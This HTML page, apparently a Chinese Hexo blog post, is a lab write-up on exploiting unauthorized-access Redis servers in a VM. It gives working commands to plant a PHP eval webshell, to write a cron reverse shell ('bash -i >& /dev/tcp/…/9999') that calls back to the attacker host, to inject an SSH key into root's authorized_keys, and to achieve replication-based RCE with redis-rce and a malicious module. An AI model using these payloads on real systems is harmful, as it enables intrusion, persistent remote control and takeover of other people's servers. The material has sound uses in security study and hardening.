@@ -1,0 +1,822 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/image/fluid.png">
+  <link rel="icon" href="/image/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="rPniu">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="redis非关系性数据库，内存数据存储系统，以键值对（key-value）的形式存储数据，用作数据库、缓存和消息队列。 Redis 的特点：✅ 基于内存，速度极快：所有数据都存储在内存中，读写速度非常快，适合做缓存使用。 ✅ 支持多种数据结构：不仅仅是字符串，复杂结构的操作也非常方便。 ✅ 持久化：虽然在内存中运行，但可以将数据定期保存到磁盘，以防丢失。 ✅ 支持发布&#x2F;订阅：可以作为轻量">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis">
+<meta property="og:url" content="https://rpniu.github.io/2025/04/17/Redis/index.html">
+<meta property="og:site_name" content="rPniu">
+<meta property="og:description" content="redis非关系性数据库，内存数据存储系统，以键值对（key-value）的形式存储数据，用作数据库、缓存和消息队列。 Redis 的特点：✅ 基于内存，速度极快：所有数据都存储在内存中，读写速度非常快，适合做缓存使用。 ✅ 支持多种数据结构：不仅仅是字符串，复杂结构的操作也非常方便。 ✅ 持久化：虽然在内存中运行，但可以将数据定期保存到磁盘，以防丢失。 ✅ 支持发布&#x2F;订阅：可以作为轻量">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rpniu.github.io/2025/04/17/Redis/kali-linux-2024.1-vmware-amd64-2025-04-15-21-37-44-17448930183791.png">
+<meta property="og:image" content="https://rpniu.github.io/2025/04/17/Redis/kali-linux-2024.1-vmware-amd64-2025-04-15-21-41-40-17448930183794.png">
+<meta property="og:image" content="https://rpniu.github.io/2025/04/17/Redis/kali-linux-2024.1-vmware-amd64-2025-04-15-21-43-14-17448930183793.png">
+<meta property="og:image" content="https://rpniu.github.io/2025/04/17/Redis/image-20250415200234858-17448930183792.png">
+<meta property="article:published_time" content="2025-04-17T12:28:33.000Z">
+<meta property="article:modified_time" content="2025-04-17T12:30:32.685Z">
+<meta property="article:author" content="rPniu">
+<meta property="article:tag" content="Redis">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://rpniu.github.io/2025/04/17/Redis/kali-linux-2024.1-vmware-amd64-2025-04-15-21-37-44-17448930183791.png">
+  
+  
+  
+  <title>Redis - rPniu</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rpniu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/image/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>rPniu</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/image/web/mao4.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Redis"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-17 20:28" pubdate>
+          2025年4月17日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Redis</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><p>非关系性数据库，内存数据存储系统，以键值对（key-value）的形式存储数据，用作数据库、缓存和消息队列。</p>
+<p>Redis 的特点：<br>✅ 基于内存，速度极快：<br>所有数据都存储在内存中，读写速度非常快，适合做缓存使用。</p>
+<p>✅ 支持多种数据结构：<br>不仅仅是字符串，复杂结构的操作也非常方便。</p>
+<p>✅ 持久化：<br>虽然在内存中运行，但可以将数据定期保存到磁盘，以防丢失。</p>
+<p>✅ 支持发布&#x2F;订阅：<br>可以作为轻量级的消息中间件使用。</p>
+<p>✅ 分布式支持：<br>通过主从复制、哨兵机制、集群等方式可以进行横向扩展和高可用部署。</p>
+<p>Redis 常作为 <strong>数据库（如MySQL） 的加速层</strong> 使用。它可以显著减少数据库压力，提升系统响应速度。</p>
+<p>默认使用6379端口</p>
+<h3 id="redis常用命令"><a href="#redis常用命令" class="headerlink" title="redis常用命令"></a>redis常用命令</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> xz <span class="hljs-string">&quot;Hacker&quot;</span>                     # 设置键xz的值为字符串Hacker<br><span class="hljs-built_in">get</span> xz                              # 获取键xz的内容<br><span class="hljs-built_in">SET</span> score 857                       # 设置键score的值为857<br>INCR score                          # 使用INCR命令将score的值增加1<br><span class="hljs-built_in">GET</span> score                           # 获取键score的内容<br>keys *                              # 列出当前数据库中所有的键<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> protected-mode <span class="hljs-literal">no</span>        # 关闭安全模式<br><span class="hljs-built_in">get</span> anotherkey                      # 获取一个不存在的键的值<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /root/redis          # 设置保存目录<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename redis.rdb     # 设置保存文件名<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">get</span> dir                      # 查看保存目录<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">get</span> dbfilename               # 查看保存文件名<br>save                                # 进行一次备份操作<br>flushall                            # 删除所有数据<br>del key                             # 删除键为key的数据<br>slaveof<span class="hljs-built_in"> ip port </span>                    # 设置主从关系<br>redis-cli -h<span class="hljs-built_in"> ip </span>-p 6379 -a passwd   # 外部连接<br><span class="hljs-built_in">info</span> #查看redis的信息和服务器信息<br></code></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>1.使用SET和GET命令，可以完成基本的赋值和取值操作；<br>2.Redis是不区分命令的大小写的，set和SET是同一个意思；<br>3.使用keys *可以列出当前数据库中的所有键；<br>4.当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)；<br>5.如果键的值中有空格，需要使用双引号括起来，如”Hello World”.</p>
+</blockquote>
+<h3 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a>未授权</h3><p>未授权是后续攻击的前提</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#requirepass foobared 可以使用空密码</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>centos</p>
+<p>Redis &lt;&#x3D; 5.0.5</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://download.redis.io/releases/redis-2.8.17.tar.gz<br>tar -zxvf redis-2.8.17.tar.gz<br><span class="hljs-built_in">cd</span> redis-2.8.17/<br>make<br><span class="hljs-built_in">cd</span> src<br>./redis-cli -h<br><span class="hljs-built_in">sudo</span> make install<br>make <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure>
+
+<p>关闭防火墙,不然有可能打不进去，所以说防火墙还是有点东西的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">永久关闭<br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">disable</span> firewalld<br>停止，重启时启动<br><span class="hljs-built_in">sudo</span> systemctl stop firewalld<br></code></pre></td></tr></table></figure>
+
+<p>启动服务</p>
+<p>src目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./redis-server ../redis.conf<br></code></pre></td></tr></table></figure>
+
+
+
+<p>探测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -p 6379 -script redis-info 192.168.88.155<br></code></pre></td></tr></table></figure>
+
+<p>扫描出东西，没关闭防火墙，可能只扫的出6379端口</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Starting Nmap <span class="hljs-number">7.94</span>SVN <span class="hljs-punctuation">(</span> https<span class="hljs-punctuation">:</span><span class="hljs-comment">//nmap.org ) at 2025-04-15 05:17 EDT</span><br>Nmap scan report for <span class="hljs-number">192.168</span>.<span class="hljs-number">88.155</span><br>Host is up <span class="hljs-punctuation">(</span><span class="hljs-number">0.00026</span>s latency<span class="hljs-punctuation">)</span>.<br><br>PORT     STATE SERVICE VERSION<br><span class="hljs-number">6379</span>/tcp open  redis   Redis key<span class="hljs-punctuation">-</span>value store <span class="hljs-number">2.8</span>.<span class="hljs-number">17</span> <span class="hljs-punctuation">(</span><span class="hljs-number">64</span> bits<span class="hljs-punctuation">)</span><br><span class="hljs-string">| redis-info: </span><br><span class="hljs-string">|   Version: 2.8.17</span><br><span class="hljs-string">|   Operating System: Linux 3.10.0-1160.el7.x86_64 x86_64</span><br><span class="hljs-string">|   Architecture: 64 bits</span><br><span class="hljs-string">|   Process ID: 10224</span><br><span class="hljs-string">|   Used CPU (sys): 0.06</span><br><span class="hljs-string">|   Used CPU (user): 0.01</span><br><span class="hljs-string">|   Connected clients: 2</span><br><span class="hljs-string">|   Connected slaves: 0</span><br><span class="hljs-string">|   Used memory: 512.22K</span><br><span class="hljs-string">|   Role: master</span><br><span class="hljs-string">|   Bind addresses: </span><br><span class="hljs-string">|     0.0.0.0</span><br><span class="hljs-string">|   Client connections: </span><br><span class="hljs-string">|_    192.168.88.129</span><br>MAC Address<span class="hljs-punctuation">:</span> <span class="hljs-number">00</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span>C<span class="hljs-punctuation">:</span><span class="hljs-number">29</span><span class="hljs-punctuation">:</span>A0<span class="hljs-punctuation">:</span><span class="hljs-number">53</span><span class="hljs-punctuation">:</span><span class="hljs-number">7</span>E <span class="hljs-punctuation">(</span>VMware<span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>连接</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-number">192.168</span><span class="hljs-number">.88</span><span class="hljs-number">.155</span><br>info <span class="hljs-meta">#查看信息</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p>1.#bind 127.0.0.1 仅允许本地访问，如果有注释符，则外部可以链接Redis数据库<br>2.protected-mode no 安全模式（从 3.2 开始引入），默认关闭<br>3.redis服务有root权限，或者高权限，可做一些事</p>
+<p>部分目录可能无权限写入，因为redis-server服务是普通用户权限开启的，这时候就需要root用户</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">config set dir /var/www/html</span><br><span class="language-xml">config set dbfilename redis.php</span><br><span class="language-xml">set webshell &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">或者</span><br><span class="language-xml"></span><br><span class="language-xml">set x &quot;\r\n\r\n</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">\r\n\r\n&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">bgsave</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure>
+
+<p>下面这个更好一点，可以减轻干扰。</p>
+<h3 id="定时任务反弹shell"><a href="#定时任务反弹shell" class="headerlink" title="定时任务反弹shell"></a>定时任务反弹shell</h3><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino">允许异地登录 <br><span class="hljs-meta">#bind 127.0.0.1</span><br><br>安全模式<span class="hljs-keyword">protected</span>-mode处于关闭状态<br><span class="hljs-keyword">protected</span>-mode no<br><br>Redis服务使用ROOT账号启动<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs swift">flushall  <br><br><span class="hljs-comment">//设置启动目录</span><br>config <span class="hljs-keyword">set</span> dir <span class="hljs-regexp">/var/</span>spool<span class="hljs-operator">/</span>cron<br><br><span class="hljs-comment">//设置启动命令 实践可以，马上弹</span><br><span class="hljs-keyword">set</span> root <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>* * * * * bash -i &gt;&amp; /dev/tcp/192.168.88.129/9999 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br><br>待修改，没实验成功<br><span class="hljs-keyword">set</span> root <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.88.129/9999 0&gt;&amp;1 <span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br><br><span class="hljs-comment">//保存的文件名</span><br>config <span class="hljs-keyword">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<p>默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;权限必须是600也就是<code>-rw——-</code>才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文件&#x2F;var&#x2F;spool&#x2F;cron&#x2F;权限644也能执行<br>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p>
+<p>查看运行shell，linux区分大小写</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="为什么有些命令找不到"><a href="#为什么有些命令找不到" class="headerlink" title="为什么有些命令找不到"></a>为什么有些命令找不到</h5><p>我早执行ifconfig时未找到，which一下</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@localhost</span> cron]<span class="hljs-comment"># which ifconfig</span><br><span class="hljs-regexp">/sbin/ifconfig</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>反弹 shell 很“瘦”</strong>，不像你平时登陆的终端那样加载完整的用户环境，它可能连 PATH 都不完整。</p>
+<p><img src="/2025/04/17/Redis/kali-linux-2024.1-vmware-amd64-2025-04-15-21-37-44-17448930183791.png" srcset="/image/loading.gif" lazyload alt="kali-linux-2024.1-vmware-amd64-2025-04-15-21-37-44"></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">export <span class="hljs-title class_">PATH</span>=<span class="hljs-variable">$PATH</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/usr/sbin</span><br></code></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="/2025/04/17/Redis/kali-linux-2024.1-vmware-amd64-2025-04-15-21-41-40-17448930183794.png" srcset="/image/loading.gif" lazyload alt="kali-linux-2024.1-vmware-amd64-2025-04-15-21-41-40"></p>
+<p>不是，这邮件是什么啊</p>
+<p><img src="/2025/04/17/Redis/kali-linux-2024.1-vmware-amd64-2025-04-15-21-43-14-17448930183793.png" srcset="/image/loading.gif" lazyload alt="kali-linux-2024.1-vmware-amd64-2025-04-15-21-43-14"></p>
+<p>应该是redis那边写进去的定时任务还在跑，但是这边没有监听了。</p>
+<h3 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h3><h5 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h5><p>1.允许异地登录<br>2.Redis服务使用ROOT账号启动<br>3.安全模式protected-mode处于关闭状态<br>4.允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器<br>5.&#x2F;root&#x2F;.ssh&#x2F;目录存在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">在kali主机中执行：<br>ssh-keygen -t rsa<br><span class="hljs-built_in">cd</span> ~/.ssh/<br>(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>; <span class="hljs-built_in">cat</span> id_rsa.pub; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; key.txt<br><span class="hljs-built_in">cat</span> key.txt | redis-cli -h 192.168.88.155 -x <span class="hljs-built_in">set</span> xxx<br> <br>连接到192.168.88.155中执行：<br>redis-cli -h 192.168.88.155<br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh/<br>config <span class="hljs-built_in">set</span> dbfilename authorized_keys<br>save<br> <br>在kali中连接：<br><span class="hljs-built_in">cd</span> ~/.ssh/<br>ssh -i id_rsa root@192.168.88.155<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/17/Redis/image-20250415200234858-17448930183792.png" srcset="/image/loading.gif" lazyload alt="image-20250415200234858"></p>
+<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>漏洞存在于<strong>4.x、5.x</strong>版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据尽量保持一致，从机只负责读，主机只负责写。</p>
+<p>在Reids 4.x之后，通过外部拓展，可以实现在redis中实现一个新的Redis命令，构造恶意.so文件。</p>
+<p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。</p>
+<p>实验环境：redis4.0.2</p>
+<h5 id="满足利用条件"><a href="#满足利用条件" class="headerlink" title="满足利用条件"></a>满足利用条件</h5><p>修改redis.conf</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">原本<br><span class="hljs-built_in">bind</span> 127.0.0.1<br>protected-mode <span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure>
+
+<p>修改后</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#bind 127.0.0.1</span><br><span class="hljs-keyword">protected</span>-mode no<br></code></pre></td></tr></table></figure>
+
+<p>利用工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
+<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>对RedisModules-ExecuteCommand工具</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> src<br><span class="hljs-keyword">make</span><br></code></pre></td></tr></table></figure>
+
+<p>可能报错缺少相关库，打开module.c文件，添加库文件</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>     <span class="hljs-comment">// ← 添加这行</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span>  <span class="hljs-comment">// ← 添加这行</span></span><br></code></pre></td></tr></table></figure>
+
+<p>把module.so移动到redis-rce目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> ./src/module.so ../redis-rce-master<br></code></pre></td></tr></table></figure>
+
+<p>使用 redis-rce</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> redis-rce.<span class="hljs-keyword">py</span> -r 目标ip-<span class="hljs-keyword">p</span> 目标端口 -L 本地ip -<span class="hljs-keyword">f</span> 恶意.<span class="hljs-keyword">so</span><br><br><span class="hljs-keyword">python</span> redis-rce.<span class="hljs-keyword">py</span> -r <span class="hljs-number">192.168</span>.<span class="hljs-number">88.155</span> -<span class="hljs-keyword">p</span> <span class="hljs-number">6379</span> -L <span class="hljs-number">192.168</span>.<span class="hljs-number">88.129</span> -<span class="hljs-keyword">f</span> module.<span class="hljs-keyword">so</span><br></code></pre></td></tr></table></figure>
+
+
